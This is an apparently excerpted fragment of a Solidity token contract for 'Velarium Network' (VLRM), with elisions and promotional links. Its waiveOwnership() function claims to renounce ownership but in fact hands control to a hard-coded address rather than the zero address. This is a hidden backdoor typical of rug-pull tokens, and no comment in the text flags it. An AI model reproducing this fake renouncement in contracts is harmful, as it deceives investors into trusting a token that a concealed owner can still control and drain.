...
/**
Website : https://velariumnetwork.art
Telegram : https://t.me/velariumofficial
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x2d352A34C906b783D732be8b7aAc932A7CB74Db5);
    }
...
contract VelariumNetwork is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Velarium Network";
    string private _symbol = "VLRM";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x3b38aC007d626f63d9AF0DDfDC63e0c839D2F238);
    address payable public teamWalletAddress = payable(0x3b38aC007d626f63d9AF0DDfDC63e0c839D2F238);
